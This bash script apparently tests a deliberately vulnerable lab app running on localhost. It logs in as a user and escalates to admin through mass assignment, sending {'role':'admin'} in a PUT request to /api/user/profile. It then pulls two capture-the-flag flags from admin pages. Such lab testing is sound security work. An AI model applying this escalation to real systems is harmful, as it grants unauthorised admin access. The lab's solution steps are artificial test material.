#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
sleep 3

PASS=0; FAIL=0

check() {
    local label="$1" result="$2"
    if [ "$result" = "1" ]; then echo "[PASS] $label"; PASS=$((PASS+1))
    else echo "[FAIL] $label"; FAIL=$((FAIL+1)); fi
}

until nc -z -w2 127.0.0.1 8084 2>/dev/null; do sleep 1; done

# Test 1: login page responds
check "login page responds" "$(curl -sf http://127.0.0.1:8084/login >/dev/null 2>&1 && echo 1 || echo 0)"

# Test 2: login as alice, extract session cookie
LOGIN_CODE=$(curl -s -c /tmp/cookies_$$.txt -o /dev/null -w "%{http_code}" \
    -H 'Content-Type: application/json' \
    -d '{"username":"alice","password":"password123"}' \
    http://127.0.0.1:8084/login 2>/dev/null)
check "alice login succeeds" "$([ "$LOGIN_CODE" = "200" ] && echo 1 || echo 0)"

COOKIE=$(grep session /tmp/cookies_$$.txt 2>/dev/null | awk '{print $6"="$7}' || echo "")

# Test 3: /admin returns 403 for regular user
CODE=$(curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies_$$.txt http://127.0.0.1:8084/admin 2>/dev/null)
check "/admin blocked for user (403)" "$([ "$CODE" = "403" ] && echo 1 || echo 0)"

# Test 4: mass assignment via PUT /api/user/profile
PUT_RESP=$(curl -sf -X PUT \
    -H 'Content-Type: application/json' \
    -b /tmp/cookies_$$.txt \
    -d '{"role":"admin"}' \
    http://127.0.0.1:8084/api/user/profile 2>/dev/null)
check "mass assignment: role set to admin" "$(echo "$PUT_RESP" | grep -q '"admin"' && echo 1 || echo 0)"

# Test 5: flag1 from /admin after escalation
ADMIN=$(curl -sf -b /tmp/cookies_$$.txt http://127.0.0.1:8084/admin 2>/dev/null)
FLAG1=$(echo "$ADMIN" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "flag1 accessible after role escalation" "$([ -n "$FLAG1" ] && echo 1 || echo 0)"
[ -n "$FLAG1" ] && echo "    flag1=$FLAG1"

# Test 6: flag2 from /admin/secrets
SECRETS=$(curl -sf -b /tmp/cookies_$$.txt http://127.0.0.1:8084/admin/secrets 2>/dev/null)
FLAG2=$(echo "$SECRETS" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "flag2 accessible from /admin/secrets" "$([ -n "$FLAG2" ] && echo 1 || echo 0)"
[ -n "$FLAG2" ] && echo "    flag2=$FLAG2"

rm -f /tmp/cookies_$$.txt
$DC down

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
